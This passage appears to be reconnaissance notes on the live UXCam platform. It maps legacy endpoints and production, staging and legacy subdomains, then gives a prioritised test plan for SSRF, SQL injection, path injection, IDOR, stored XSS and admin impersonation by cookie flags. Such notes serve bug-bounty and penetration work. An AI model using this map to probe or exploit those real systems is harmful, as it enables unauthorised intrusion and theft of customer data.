https://pythonapi-prod.uxcam.com      — Legacy Python API v1/v2
https://das-api.uxcam.com             — Data Access Service
https://visualization-sec.uxcam.com   — Visualization sec env
```

### Legacy Endpoints (may have weaker validation)
```
/test/response                       — Test endpoint (may be live)
/app/create/organization/            — Old app creation (no region)
/session/add/custom/label/to/sessions — Old label API
/session/update/labels               — Old label update
/events/bulk/                        — Bulk events (old)
/events/diagnostic/                  — Event diagnostics (old)
/aisession/                          — Old AI session
/aisessions/analytics                — Old AI analytics
/aisessions/list/                    — Old AI list
/screenvisit_event/create|update|delete — Old screen event CRUD
/screenburst                         — Old screen burst
/screenflow                          — Old screen flow
/user_properties                     — Old user properties
/heatmaps/list/1/                    — Old heatmap list
/configuration                       — Old configuration
/check-plan-status                   — Old plan check
/cancel-subscription                 — Old cancel
/active-subscription                 — Old active sub
/current-subscription                — Old current sub
/checkout-link/                      — Old checkout
/confirm-and-pay                     — Old payment
/exceptions/exception_logs           — Old exceptions
/exceptions/public/exception_logs    — Old public exceptions
```

---

## 12. SUBDOMAINS REFERENCED IN SOURCE (22)

### Production
```
admin.uxcam.com                 — Admin panel
app.uxcam.com                   — Main app
assets.uxcam.com                — Static assets
auth.uxcam.com                  — Auth service
developer.uxcam.com             — Developer docs
help.uxcam.com                  — Help center (Intercom)
info.uxcam.com                  — Marketing (HubSpot)
integrated-platforms.uxcam.com  — Integration platform
integration.mcp.uxcam.com      — MCP integration
resources.uxcam.com             — Resources/ebooks
sdk.uxcam.com                   — SDK distribution
signup-app-details.uxcam.com    — Signup service
status.uxcam.com                — Status page
tara.uxcam.com                  — Tara AI assistant
websdk-proxy.uxcam.com          — WebSDK proxy (SSRF target)
websdk-recording.uxcam.com      — WebSDK recording
www.uxcam.com                   — Marketing site
```

### Staging/UAT
```
appuat.uxcam.com                — UAT environment
event-tracking-staging.uxcam.com
event-tracking-uat.uxcam.com
uxcam-dashboard-builder-staging.uxcam.com
uxcam-dashboard-builder-stg.uxcam.com
uxcam-dashboard-builder-uat.uxcam.com
uxcam-dashboard-builder-sec.uxcam.com
```

### Legacy (Wayback)
```
dashboardapi.uxcam.com
dashboardapi-sec.uxcam.com
pythonapi-prod.uxcam.com
das-api.uxcam.com
visualization-sec.uxcam.com
```

---

## 13. TESTING PRIORITY MATRIX

### P0: CRITICAL (Test Immediately)
1. **Webhook SSRF** — `PYTHON_API_URL/issue_notification/test` — server makes HTTP request to user-supplied webhookUrl
2. **websdk-proxy SSRF** — `websdk-proxy.uxcam.com/api/proxy?url=` — server-side URL fetch
3. **search_attribute SQLi** — `PYTHON_API_URL/search_attribute` — free-text search param → Trino
4. **Path injection (settingApi)** — `updatePaymentInfo({requestUrl})`, `getChargebeeLink(url)`, `updateMFAStatus(data, endPoint)` — user-controlled path segments
5. **Admin cookie impersonation** — Set `loggedInFromAdminDashboard=1` + `loggedInType=admin` — if backend trusts these

### P1: HIGH
5. **orderBy injection** — `custom-list` and `screen/sessions` endpoints accept orderBy
6. **Trino heatmap SQLi** — `screens/trino/*` (5 endpoints) — different handler than confirmed SQLi
7. **Event analytics SQLi** — `events/event_count`, `events/list` — different handler
8. **Funnel SQLi** — `funnels/*` especially `funnel-suggestions` with `last_step_value`
9. **GraphQL IDOR** — 128 Relay operations, especially Delete/ChangeRole/Export mutations
10. **Forward endpoint** — `POST /forward` with `name`+`kwargs` — function injection/SSRF

### P2: MEDIUM
11. **CSV export SQLi** — `csv_export/page_export` — different code path, may bypass validation
12. **AI sessions SQLi** — `ai/sessions/*` — newer code, `batch/analyze` with session_ids
13. **Timezone injection** — `activity_attribute_date_range.tz` → Trino date functions
14. **Tara AI proxy paths** — `/_tara_*` path traversal to internal services
15. **Stored XSS via session notes** — dangerouslySetInnerHTML with user content
16. **Legacy endpoint testing** — `dashboardapi.uxcam.com`, `pythonapi-prod.uxcam.com`
17. **Tara internal endpoints** — `/api/internal/*` without admin flag
18. **Public crash logs** — `crashes/public/crash_logs`, `uifreezes/public/ui_freeze_logs`
19. **Google Maps API key** — Test restriction status

### P3: LOW-MEDIUM
20. **Segment CRUD** — `segment/app/{appId}/{page}/list|create|edit|delete`
21. **Token refresh race** — TokenRefreshManager with isRefreshing lock
22. **Column sort injection** — `preference/column-sort-order`
23. **/sessions/shortify** — Public endpoint (no auth interceptors via plain axios)
24. **PII in URLs** — `info.uxcam.com/meetings/...?email=X&firstname=Y`
25. **S3 bucket** — `s3.amazonaws.com/static.uxcam.com/staticscreenshots/`

---

## 14. INJECTION PATTERN STATISTICS

| Category | Count | Key Patterns |
|----------|-------|-------------|
| SSRF Vectors | 1,640 | 36 dynamic fetch, 108 proxy/forward, 151 URL construction |
| Redirect/Open Redirect | 2,412 | 23 location, 82 navigate, 2,298 param-based |
| Upload/File Handling | 1,697 | 1,278 extension check, 396 handler, 17 formdata |
| File Operations | 854 | 92 delete, 737 upload, 14 read |
| Weak Crypto | 364 | 342 weak key, 10 atob/btoa, 7 Math.random |
| XSS Vectors | 162 | 11 dangerouslySetInnerHTML, 105 DOM manipulation, 28 innerHTML |
| Deserialization/Template | 146 | 123 JSON.parse, 11 template engine, 12 template literal |
| Prototype Pollution | 61 | 51 bracket access, 9 direct, 1 recursive assign |
| Cmd Injection/Eval | 61 | 19 child_process, 41 script injection, 1 eval/new Function |
| JWT Handling | 30 | 1 decode, 1 sign, 28 storage |
| Secrets/Hardcoded | 29 | 5 API key, 4 AWS key, 2 GCP key, 18 internal URL |
| CSP/Security Headers | 14 | 14 CSP config references |
| Regex DoS | 10 | 10 dynamic regex patterns |
| **TOTAL** | **7,480** | |

---

## 15. TARA-EXCLUSIVE FEATURE GROUPS (25)

Features on tara.uxcam.com NOT present on app.uxcam.com:

1. Internal analytics platform (8 endpoints)
2. Admin user management
3. AI durable runs (5 endpoints)
4. Knowledge base (5 endpoints)
5. Scheduled assignments (12+ endpoints)
6. Evidence management
7. Handoff kits
8. Natural language filter
9. Skills/capabilities
10. Command center search
11. App store reviews (12+ endpoints)
12. Jira/ticketing (30+ endpoints)
13. API key management (9 endpoints)
14. Web pages/heatmaps (10+ endpoints)
15. Stability analysis
16. Video analysis
17. Weekly digest system (15+ endpoints)
18. Report templates
19. Dashboard categories
20. Screen insights
21. Context snapshots
22. Session sharing (generate/send/view)
23. Impersonation system (start/end)
24. SSE streaming chat
25. Prompt reload

---

## 16. TARA REQUEST PATTERNS

### fetchClient Internals
```
- All requests go through V() wrapper function
- V() adds X-Tara-Login-Type header from localStorage (admin|customer)
- V() adds X-Tara-Nav-Status-Scenario header
- 401 on customer login -> tries refresh via POST https://auth.uxcam.com/refresh-token
- 401 on admin login -> redirects to /login
```

### Chat/Tara Streaming Body
```json
POST /chat
{
  "appName": "tara",
  "userId": "<localStorage tara-user-id>",
  "sessionId": "<generated>",
  "newMessage": "<string>",
  "streaming": true,
  "app_id": "<appId>",
  "persona": "<optional>",
  "dashboard_context": "<optional>",
  "question_context": "<optional>",
  "artifact_context": "<optional>",
  "report_id": "<optional>",
  "knowledge_context": "<optional>",
  "response_instructions": "<optional>",
  "model": "<optional>",
  "execution_mode": "<optional>",
  "tool_name": "<optional>",
  "tool_args": "<optional>",
  "run_id": "<optional>",
  "workflow_id": "<optional>"
}
```

---

## 17. ENV VARIABLE COMPLETE MAP

### Backend URLs (16)
```
API_URL, AUTH_API_URL, DB_API_URL, IDH_API_URL,
PYTHON_API_URL, PYTHON_API_URL_V2, REDIRECT_URL, SUBSCRIPTION_URL,
TARA_PROD_API, TARA_UAT_API, TARA_STAGING_API,
TARA_EXPERIENCE_API, TARA_CX_API, TARA_BIZOPS_API,
TARA_RESEARCH_API, TARA_DASHBOARD_URL
```

### Third-Party Integration Keys (18)
```
GOOGLE_CLIENT_ID, INTERCOM_APP_KEY, MIXPANEL, HOTJAR_ID,
HUBSPOT_ID, FORM_TARA_UPGRADE_HUBSPOT_ID, CHARGEBEE_SITE_NAME,
ROLLBAR_POST_CLIENT_ITEM, IDH_ROLLBAR_POST_CLIENT_ITEM,
FEATURE_FLAG_ID, JIRA_DATA_KEY, GTM, SITE_KEY,
CAPTCHA_EMAIL_VALIDATION, UXCAM_WEBSDK_APP_KEY, USE_PROXY,
APP_ENV, NEXT_PUBLIC_CODE_VERSION
```

### Signup Flow IDs (3)
```
FLOW_ADD_APP_ID, FLOW_DEPARTMENT_ID, FLOW_ORGANIZATION_ID
```
